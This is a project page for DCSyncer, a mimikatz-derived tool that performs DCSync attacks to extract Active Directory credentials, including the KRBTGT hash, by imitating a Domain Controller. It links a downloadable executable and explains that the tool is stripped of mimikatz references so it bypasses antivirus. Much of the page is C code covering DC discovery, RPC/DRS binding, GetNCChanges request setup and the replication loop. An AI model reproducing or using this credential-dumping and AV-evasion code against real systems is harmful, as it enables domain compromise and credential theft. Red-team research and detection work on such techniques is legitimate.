---
layout: page
title: DCSyncer
description: Tool derived from mimikatz that performs DCSync operation
github: https://github.com/notsoshant/DCSyncer
download: https://github.com/notsoshant/DCSyncer/releases/download/v1.0/DCSyncer-x64.exe
ext-js: https://buttons.github.io/buttons.js
---

[Follow @notsoshant](https://github.com/notsoshant){:class="github-button" data-size="large" aria-label="Follow @notsoshant"}
[notsoshant/DCSyncer]({{ page.github }}){:class="github-button" data-icon="octicon-repo-forked" data-size="large" aria-label="View notsoshant/DCSyncer on GitHub"}
[Download]({{ page.download }}){:class="github-button" data-icon="octicon-download" data-size="large" aria-label="Download notsoshant/DCSyncer on GitHub"}

DCSyncer is a tool that performs DCSync operation. DCSync is a method to extract credentials, including that of KRBTGT, from a remote system by simulating behavior of a Domain Controller. This method is very powerful as you don't need any command execution _on_ the Domain Controller. You also don't need to be a Domain Admin to perform this operation, you need a user with _Replicating Directory Changes_ and _Replicating Directory Changes All_ permissions. For more details on DCSync attack and its prevention, read [Mimikatz DCSync Usage, Exploitation, and Detection](https://adsecurity.org/?p=1729).

Huge thanks to [Sumit Verma](https://www.linkedin.com/in/sumit-verma-125576129/) for coming up with the idea behind the tool!

![Image](/img/tools/dcsyncer/dcsyncer-1.png){: .center-block :}

![Image](/img/tools/dcsyncer/dcsyncer-2.png){: .center-block :}

## Mimikatz and need for DCSyncer

[Mimikatz](https://github.com/gentilkiwi/mimikatz) comes with capability to perform DCSync operation. [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) can also perform this operation. Antivirus detection for these tools are strong. But AVs don't often do it right, most of the times they rely on some string or pattern matching that can be easily bypassed by recompiling the tool with few modifications.

Idea behind this tool was to show that we can't entirely rely on AVs to keep us secure. This is an attempt to extract only the code piece relevant to DCSync from mimikatz's huge, feature-rich codebase. This tool, though extracted from mimikatz, tries to avoid any reference to it so that it can bypass some well known AVs.

## Working

A DCSync operation uses [Directory Replication Service (DRS) Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47) to simulate a Domain Controller. It uses the [`GetNCChanges`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) function to do so. DCSyncer uses code extracted mainly from [RPC](https://github.com/gentilkiwi/mimikatz/blob/master/modules/rpc/kull_m_rpc.c), [DRS](https://github.com/gentilkiwi/mimikatz/blob/master/modules/rpc/kull_m_rpc_drsr.c) and [MS-DRS](https://github.com/gentilkiwi/mimikatz/blob/master/modules/rpc/kull_m_rpc_ms-drsr_c.c) modules of mimikatz. The main DCSync function is replica of mimikatz's, but I've written it manually to understand each and every step involved in the process.

Let's dissect the main DCSync function to see how it works.

#### Get the Domain Info and the DC

```c
getCurrentDomainInfo(&pDomainInfo);
szDomain = pDomainInfo->DnsDomainName.Buffer;
PRINT_INFO(L"Domain would be %s\n", szDomain);

getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &szDc);
PRINT_INFO(L"DC would be %s\n", szDc);
```

`getCurrentDomainInfo()` is calling [`LsaQueryInformationPolicy()`](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsaqueryinformationpolicy) in background to get the `PolicyDnsDomainInformation` which retrieves DNS information. `getDc()` would use Domain extracted from DNS information and call [`DsGetDcName()`](https://docs.microsoft.com/en-us/windows/win32/api/dsgetdc/nf-dsgetdc-dsgetdcnamea) in to get the DC.

#### Create RPC Binding

```c
szService = L"ldap";
RtlGetNtVersionNumbers(&pMajor, &pMinor, &pBuild);

createBinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE, (pMajor < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, RpcSecurityCallback);

getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt);
```

`createBinding()` is taken from RPC module of mimikatz which will create a RPC bind to the DC. `getDomainAndUserInfos()` will first create a DRS handle using [`IDL_DRSBind()`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/605b1ea1-9cdc-428f-ab7a-70120e020a3d) and then use [`IDL_DRSDomainControllerInfo()`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/668abdc8-1db7-4104-9dea-feab05ff1736) and [`IDL_DRSCrackNames()`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/9b4bfb44-6656-4404-bcc8-dc88111658b3) to retrieve information about DC.

#### Preparing for GetNCChanges

```c
getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs, &DrsExtensionsInt);

getChReq.V8.pNC = &dsName;
getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
getChReq.V8.cMaxObjects = (allData ? 1000 : 1);
getChReq.V8.cMaxBytes = 0x00a00000; // 10M
getChReq.V8.ulExtendedOp = (allData ? 0 : EXOP_REPL_OBJ);
getChReq.V8.pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT*)MIDL_user_allocate(sizeof(PARTIAL_ATTR_VECTOR_V1_EXT) + sizeof(ATTRTYP) * ((allData ? ARRAYSIZE(dcsync_oids_export) : ARRAYSIZE(dcsync_oids)) - 1));
getChReq.V8.pPartialAttrSet->dwVersion = 1;
getChReq.V8.pPartialAttrSet->dwReserved1 = 0;

if (allData)
{
    getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(dcsync_oids_export);
    for (i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
        MakeAttid(&getChReq.V8.PrefixTableDest, dcsync_oids_export[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
}
else
{
    getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(dcsync_oids);
    for (i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
        MakeAttid(&getChReq.V8.PrefixTableDest, dcsync_oids[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
}
```

`getDCBind()` will call [`IDL_DRSBind()`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/605b1ea1-9cdc-428f-ab7a-70120e020a3d) again, this time with UUID obtained from `getDomainAndUserInfos()` to create a handle that will be used by `GetNCChanges()`. Lines that follow are just setting up other parameters for the request message.

#### Calling GetNCChanges and decrypting response

```c
do
{
    RtlZeroMemory(&getChRep, sizeof(DRS_MSG_GETCHGREPLY));
    drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
    if (drsStatus == 0)
    {
        if (dwOutVersion == 6 && (allData || getChRep.V6.cNumObjects == 1))
        {
            if (ProcessGetNCChangesReply(&getChRep.V6.PrefixTableSrc, getChRep.V6.pObjects))
            {
                ...
            }
            else
            ...
        }
        ...
    }
}
while (getChRep.V6.fMoreData);
```

Finally, a call to [`IDL_DRSGetNCChanges()`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894). Lines that follow are decrypting the response of this call and printing the output.
